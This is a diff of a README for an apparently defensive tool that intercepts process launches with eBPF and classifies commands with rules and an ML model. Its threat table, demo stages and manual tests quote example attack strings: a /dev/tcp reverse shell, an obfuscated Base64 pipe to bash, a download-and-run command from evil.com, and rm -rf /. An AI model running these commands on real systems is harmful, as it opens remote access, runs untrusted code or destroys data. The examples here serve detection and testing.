@@ -1,110 +1,175 @@
+<div align="center">
+
+<img src="https://img.shields.io/badge/Python-3.11-3776AB?style=for-the-badge&logo=python&logoColor=white" />
+<img src="https://img.shields.io/badge/FastAPI-0.100+-009688?style=for-the-badge&logo=fastapi&logoColor=white" />
+<img src="https://img.shields.io/badge/React-18-61DAFB?style=for-the-badge&logo=react&logoColor=black" />
+<img src="https://img.shields.io/badge/eBPF-Kernel%20Guard-EE0000?style=for-the-badge&logo=linux&logoColor=white" />
+<img src="https://img.shields.io/badge/SQLite-Persistent-003B57?style=for-the-badge&logo=sqlite&logoColor=white" />
+<img src="https://img.shields.io/badge/ML-Scikit--Learn-F7931E?style=for-the-badge&logo=scikit-learn&logoColor=white" />
+
+<br /><br />
+
 # 🛡️ AI Bouncer + Kernel Guard
 
-> **Real-time RCE prevention** — eBPF kernel hooks + ML detection + live dashboard.
+### *A Hybrid Architecture for Real-Time RCE Prevention*
 
-AI Bouncer intercepts every `execve` syscall at the kernel level, runs it through a rule engine + ML model, and surfaces the result in a live React dashboard — all within a few milliseconds.
+**AI Bouncer + Kernel Guard** is a production-grade security system that intercepts every process spawn at the kernel level, runs it through a cascading AI pipeline, and surfaces the result — with a human-readable explanation — on a live dashboard in milliseconds.
 
----
+No new process runs without an intelligent **"OK"** from the AI.
 
-## 📋 Table of Contents
-
-1. [How It Works](#how-it-works)
-2. [Prerequisites](#prerequisites)
-3. [Setup & Installation](#setup--installation)
-4. [Running the System](#running-the-system)
-5. [Running the Demo](#running-the-demo)
-6. [Configuration Reference](#configuration-reference)
-7. [Ownership Modes](#ownership-modes)
-8. [Testing](#testing)
-9. [Docs](#docs)
+</div>
 
 ---
 
-## How It Works
+## 📖 The Problem We Solve
+
+Remote Code Execution (RCE) is the **"holy grail" for attackers** — once an attacker executes their own commands on your server, they own the system. Traditional defenses have three critical blind spots:
+
+| Blind Spot | Why It Fails |
+|---|---|
+| **Static Rule Evasion** | Attackers bypass filters using Base64, command chaining, and obfuscation |
+| **Contextless Enforcement** | A firewall says *"Blocked"* — it can't tell you *why*, or what the attacker was trying to do |
+| **Kernel Blind Trust** | Linux trusts any request from an authorized app — if an app is tricked, the kernel obeys |
+
+**AI Bouncer solves all three** — using eBPF at the kernel level for enforcement and cascading AI logic for intelligence and explanation.
+
+---
+
+## 🏗️ Architecture: The Security Sandwich
 
 ```
-execve syscall → eBPF kernel hook → Detection Pipeline → WebSocket → Dashboard
-                                         │
-                              Rule Engine (60%) + ML Scorer (40%)
-                                         │
-                              Risk Score 0–100 → safe / suspicious / malicious
+┌─────────────────────────────────────────────────────────────────┐
+│  👁️  Layer 3: Dashboard (The Eye)                               │
+│      React UI · Real-time WebSocket feed · Attack explanations  │
+└────────────────────────┬────────────────────────────────────────┘
+                         │ WebSocket (ws://)
+                         ▼
+┌─────────────────────────────────────────────────────────────────┐
+│  🧠 Layer 2: AI Bouncer (The Brain)                             │
+│      FastAPI · SQLite persistence · WebSocket broadcast         │
+│                                                                 │
+│      ┌─────────────────────────────────────────────────┐        │
+│      │  Tier A: Rule Engine  (60% weight, <1ms)        │        │
+│      │  → Pattern matching: shells, injections, RCEs   │        │
+│      │  → Keyword detection: curl, wget, nc, eval...   │        │
+│      │  → Entropy detection: Base64, hex payloads      │        │
+│      ├─────────────────────────────────────────────────┤        │
+│      │  Tier B: ML Scorer    (40% weight, ~5ms)        │        │
+│      │  → Logistic Regression on TF-IDF features       │        │
+│      │  → Trained on labeled command dataset           │        │
+│      └─────────────────────────────────────────────────┘        │
+│      Combined risk score 0-100 → safe / suspicious / malicious  │
+└────────────────────────┬────────────────────────────────────────┘
+                         │
+┌─────────────────────────────────────────────────────────────────┐
+│  💪 Layer 1: Kernel Guard (The Muscle)                          │
+│      eBPF tracepoint on execve syscall                          │
+│      → Captures: PID, PPID, UID, command, args                  │
+│      → Streams to user-space via ring buffer                    │
+│      → Graceful fallback on Windows / macOS / WSL               │
+└─────────────────────────────────────────────────────────────────┘
 ```
 
-On **Windows / macOS**: The kernel hook is unavailable. Use `POST /analyze` or the demo script to send commands manually — the detection pipeline is fully functional.
+### ⚡ Why Not Just Use AI?
+
+The biggest problem with AI in security is **speed**. If you wait 5 seconds for a model to respond, the server is already compromised. We solve this with **Cascading Logic**:
+
+1. **Simple commands** → cleared in milliseconds by the Rule Engine
+2. **Complex/suspicious commands** → ML Scorer flags and blocks immediately
+3. **Explanation** → generated asynchronously so the block happens first, insight follows
 
 ---
 
-## Prerequisites
+## 🎯 Real-World Threat Coverage
 
-Make sure you have these installed before starting:
+| Attack Type | Example | How We Stop It |
+|---|---|---|
+| **Command Injection** | `127.0.0.1; bash -i` | Rule Engine: injection pattern match |
+| **Reverse Shell** | `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` | Rule Engine: reverse shell pattern |
+| **Obfuscated Payload** | `bash -c "{echo,YmFzaC...}\|{base64,-d}\|bash"` | ML: high entropy score |
+| **Script Download** | `curl http://evil.com/script.sh \| bash` | Rule Engine: pipe-to-shell pattern |
+| **Destructive Command** | `rm -rf / --no-preserve-root` | Rule Engine: destructive pattern |
+| **Log4Shell-style** | App spawning unexpected shell | Kernel intercepts the execve spawn |
+
+---
+
+## 🚀 Quick Start
+
+### Prerequisites
 
 | Tool | Version | Install |
 |---|---|---|
-| Python | 3.10+ | [python.org](https://www.python.org/downloads/) |
-| Node.js | 18+ | [nodejs.org](https://nodejs.org/) |
-| conda (optional) | any | [miniconda](https://docs.conda.io/en/latest/miniconda.html) |
-| Git | any | [git-scm.com](https://git-scm.com/) |
+| 🐍 Python | 3.10+ | [python.org](https://www.python.org/downloads/) |
+| 📦 Node.js | 18+ | [nodejs.org](https://nodejs.org/) |
+| 🐧 WSL2 (Windows users) | Any | [Microsoft Docs](https://learn.microsoft.com/en-us/windows/wsl/install) |
+| 🐍 conda (recommended) | Any | [Miniconda](https://docs.conda.io/en/latest/miniconda.html) |
 
-> **WSL users**: Run all Python/backend commands inside your WSL terminal. The frontend can run on Windows or WSL.
+> **🪟 Windows users**: Run all Python/backend commands inside WSL. The frontend can run on native Windows.
 
 ---
 
-## Setup & Installation
-
-### Step 1 — Clone the repo
+### 📥 Step 1 — Clone the Repository
 
 ```bash
-git clone https://github.com/your-org/kernal_ai_bouncer.git
+git clone https://github.com/Raphel6969/kernal_ai_bouncer.git
 cd kernal_ai_bouncer
 ```
 
-### Step 2 — Create and activate Python environment
+---
+
+### 🐍 Step 2 — Set Up Python Environment
 
 ```bash
-# Using conda (recommended)
+# Using conda (recommended — isolates dependencies cleanly)
 conda create -n aibouncer python=3.11 -y
 conda activate aibouncer
 
-# OR using venv
+# OR using standard venv
 python -m venv .venv
-source .venv/bin/activate   # Linux/macOS/WSL
-# .venv\Scripts\activate    # Windows PowerShell
+source .venv/bin/activate      # Linux / macOS / WSL
+# .\.venv\Scripts\activate     # Windows PowerShell
 ```
 
-### Step 3 — Install Python dependencies
+---
+
+### 📦 Step 3 — Install Backend Dependencies
 
 ```bash
 pip install -r requirements.txt
 ```
 
-### Step 4 — Set up environment variables
+> If you see a warning about `bcc` or `eBPF`, that's expected on Windows/WSL — the system will automatically fall back to API-only mode.
+
+---
+
+### ⚙️ Step 4 — Configure Environment
 
 ```bash
-# Copy the example env file
+# Copy the example config (defaults work for local dev)
 cp .env.example .env
-
-# The defaults work for local dev — no changes needed unless you're deploying
 ```
 
-### Step 5 — Install frontend dependencies
+The defaults are ready to go. Only edit `.env` if you need to change a port or set up a public deployment. See [Configuration Reference](#%EF%B8%8F-configuration-reference) below.
+
+---
+
+### 🎨 Step 5 — Install Frontend Dependencies
 
 ```bash
 cd frontend
-cp .env.example .env   # frontend config (sets VITE_API_URL)
 npm install
 cd ..
 ```
 
 ---
 
-## Running the System
+### ▶️ Step 6 — Run the System
 
-You need **two terminals** running at the same time.
+You need **two terminals** running simultaneously.
 
-### Terminal 1 — Start the Backend
-
+**Terminal 1 — Backend**
 ```bash
-conda activate aibouncer  # (or source .venv/bin/activate)
+conda activate aibouncer
 python -m uvicorn backend.app:app --host 0.0.0.0 --port 8000
 ```
 
@@ -116,55 +181,56 @@ You should see the startup banner:
    Owner Mode:    backend
    API URL:       http://0.0.0.0:8000
    WebSocket URL: ws://0.0.0.0:8000/ws
-   Kernel Active: NO   (YES on Linux with eBPF support)
+   Kernel Active: YES
 ==================================================
 ✅ Backend ready!
 ```
 
-Verify it's alive:
+Quick verify:
 ```bash
 curl http://localhost:8000/healthz
-# {"status": "ok"}
+# → {"status": "ok"}
 ```
 
-### Terminal 2 — Start the Frontend Dashboard
-
+**Terminal 2 — Frontend Dashboard**
 ```bash
 cd frontend
 npm run dev
 ```
 
-Open **[http://localhost:5173](http://localhost:5173)** in your browser.
+Open **[http://localhost:5173](http://localhost:5173)** — you should see:
 
-You should see the dashboard with:
-- ✅ **Backend: Online** pill in the top-right
-- ✅ **WebSocket: Connected** pill
-- 🛡️ **Remediation: OFF** toggle (leave OFF unless on Linux with eBPF)
+| Indicator | Expected |
+|---|---|
+| 🟢 Backend pill | **Online** |
+| 🟢 WebSocket pill | **Connected** |
+| 🛡️ Remediation toggle | **OFF** (safe default) |
 
 ---
 
-## Running the Demo
+## 🎬 Running the Demo
 
-With both services running, open a third terminal and run:
+With both services running, open a third terminal:
 
 ```bash
 bash scripts/demo.sh
 ```
 
-The script will walk you through three detection stages with pauses so you can point to the dashboard between each:
+The demo walks through **3 interactive stages** — press `Enter` between each so you can point at the dashboard:
 
-1. **Stage 1: Benign** — `ls -la /var/log` → classified `safe`
-2. **Stage 2: Suspicious** — `eval $(cat /tmp/script.sh)` → classified `suspicious`
-3. **Stage 3: Malicious** — reverse shell attempt → classified `malicious`
+| Stage | Command | Expected Result |
+|---|---|---|
+| ✅ Benign | `ls -la /var/log` | `safe` — no patterns, low risk |
+| ⚠️ Suspicious | `eval $(cat /tmp/script.sh)` | `suspicious` — obfuscation pattern |
+| 🚨 Malicious | `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` | `malicious` — reverse shell, high entropy |
 
-> Press `Enter` between stages to advance. Watch the dashboard update live!
-
-**Quick manual test** (no script):
+**Manual test (no script needed):**
 ```bash
-# Linux/macOS/WSL
+# Linux / WSL
 curl -s -X POST http://localhost:8000/analyze \
   -H "Content-Type: application/json" \
-  -d '{"command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}' | python3 -m json.tool
+  -d '{"command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}' \
+  | python3 -m json.tool
 
 # Windows PowerShell
 Invoke-RestMethod -Method Post -Uri "http://localhost:8000/analyze" `
@@ -172,66 +238,128 @@ Invoke-RestMethod -Method Post -Uri "http://localhost:8000/analyze" `
   -Body '{"command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}'
 ```
 
+Expected response:
+```json
+{
+  "classification": "malicious",
+  "risk_score": 92.5,
+  "matched_rules": ["reverse_shell_pattern"],
+  "ml_confidence": 0.95,
+  "explanation": "🚨 Command is likely malicious and should be blocked..."
+}
+```
+
 ---
 
-## Configuration Reference
+## ⚙️ Configuration Reference
 
-All config is driven by `.env` at the project root and `frontend/.env`.
+All configuration lives in **one file**: `.env` at the project root.
 
-### Backend (`.env`)
+### Backend Settings
 
 | Variable | Default | Description |
 |---|---|---|
-| `KERNEL_MONITOR_OWNER` | `backend` | Who owns eBPF hooks: `backend`, `agent`, or `disabled` |
-| `API_HOST` | `0.0.0.0` | Host the backend binds to |
-| `API_PORT` | `8000` | Port the backend listens on |
-| `API_LOG_LEVEL` | `info` | Uvicorn log level |
+| `KERNEL_MONITOR_OWNER` | `backend` | Who owns eBPF hooks: `backend`, `agent`, `disabled` |
+| `API_HOST` | `0.0.0.0` | Host address to bind |
+| `API_PORT` | `8000` | Port to listen on |
+| `API_LOG_LEVEL` | `info` | Log verbosity: `debug`, `info`, `warning` |
 | `FRONTEND_ORIGINS` | `http://localhost:5173,...` | Comma-separated CORS-allowed origins |
-| `DB_PATH` | `data/events.db` | SQLite database path (auto-absolutified) |
-| `EVENT_CACHE_SIZE` | `1000` | Max in-memory events |
-| `BACKEND_URL` | `http://localhost:8000` | URL agent uses to forward events |
-| `AGENT_EVENT_TIMEOUT` | `5` | Agent HTTP request timeout (seconds) |
+| `DB_PATH` | `data/events.db` | SQLite path (auto-resolved to absolute) |
+| `EVENT_CACHE_SIZE` | `1000` | Max in-memory event cache |
+| `BACKEND_URL` | `http://localhost:8000` | URL the agent uses to forward events |
+| `AGENT_EVENT_TIMEOUT` | `5` | Agent HTTP timeout in seconds |
 
-### Frontend (`frontend/.env`)
+### Frontend Settings
 
 | Variable | Default | Description |
 |---|---|---|
-| `VITE_API_URL` | `http://localhost:8000` | Backend base URL used by all frontend API calls |
+| `VITE_API_URL` | `http://localhost:8000` | Backend URL used by all dashboard API calls |
+
+> **For a public demo:** change `VITE_API_URL` and `FRONTEND_ORIGINS` to your tunnel URL (e.g. ngrok). That's the only change needed.
 
 ---
 
-## Ownership Modes
+## 🔒 Kernel Monitor Ownership Modes
 
-The `KERNEL_MONITOR_OWNER` env var controls who attaches the eBPF hooks. This prevents duplicate kernel event capture.
+The `KERNEL_MONITOR_OWNER` variable controls which process attaches the eBPF hook. This prevents duplicate event capture.
 
 | Mode | Who runs eBPF | Use when |
 |---|---|---|
-| `backend` **(default)** | FastAPI backend process | Running backend directly |
-| `agent` | Agent sidecar process | Running agent as standalone service |
-| `disabled` | Nobody | Windows / macOS / testing without kernel |
+| `backend` *(default)* | FastAPI process | Running backend directly |
+| `agent` | Agent sidecar | Running agent as a standalone service |
+| `disabled` | Nobody | Windows / macOS / testing |
 
-> ⚠️ **Never set both backend and agent to run eBPF simultaneously** — you will get duplicate events.
+> ⚠️ **Never run both `backend` and `agent` in eBPF mode simultaneously** — you will get duplicate events.
 
 ---
 
-## Testing
+## 🧪 Testing
 
 ```bash
 # Run all tests
 python -m pytest tests/ -v
 
-# Run a specific test file
+# Run specific suite
 python -m pytest tests/test_kernel_owner.py -v
 ```
 
-Expected output: **5 passing** (ownership mode + queue handoff tests).
+Test suites cover:
+- ✅ Ownership mode regression (`backend`, `agent`, `disabled`)
+- ✅ Thread-safe kernel callback → async queue handoff
+- ✅ No duplicate events in `backend` owner mode
+- ✅ Agent backoff/retry when backend is unreachable
 
 ---
 
-## Docs
+## 📚 Documentation
 
 | Doc | Purpose |
 |---|---|
 | [`docs/API.md`](docs/API.md) | All endpoints, request/response shapes, WebSocket protocol |
-| [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md) | System diagram, component breakdown, detection pipeline |
-| [`docs/archive/`](docs/archive/) | Historical build logs and roadmap notes |
+| [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md) | Deep-dive: eBPF hook, detection pipeline, ownership model |
+| [`docs/WHITEPAPER.pdf`](docs/WHITEPAPER.pdf) | Full technical whitepaper with architecture diagrams, execution flow, detection methodology, and system design |
+| [`docs/archive/`](docs/archive/) | Historical build logs and project roadmap |
+
+---
+
+## 📄 Whitepaper
+
+The project whitepaper provides a detailed breakdown of:
+
+- System architecture
+- eBPF execution interception flow
+- Hybrid detection engine
+- ML scoring pipeline
+- WebSocket event propagation
+- Real-time remediation strategy
+- Dashboard communication model
+
+## 🗺️ Roadmap
+
+- [x] eBPF kernel hook (execve tracepoint)
+- [x] Rule Engine + ML Scorer pipeline
+- [x] Live WebSocket dashboard
+- [x] SQLite persistence + alert webhooks
+- [x] Auto-remediation (kill malicious process)
+- [x] `/healthz` liveness probe
+- [x] Startup banner with system state
+- [ ] Rate limiting (Phase 3)
+- [ ] API key auth + tunnel protection (Phase 3)
+- [ ] LLM-powered explanation tier (Tier C)
+- [ ] XDP network packet filtering
+- [ ] Local SLM for offline/air-gapped deployments
+- [ ] Memory-level fileless attack detection
+
+---
+
+## 👥 Team
+
+Built by the **Kernal Security** team.
+
+---
+
+<div align="center">
+
+**⭐ Star this repo if it helped you understand kernel-level security!**
+
+</div>
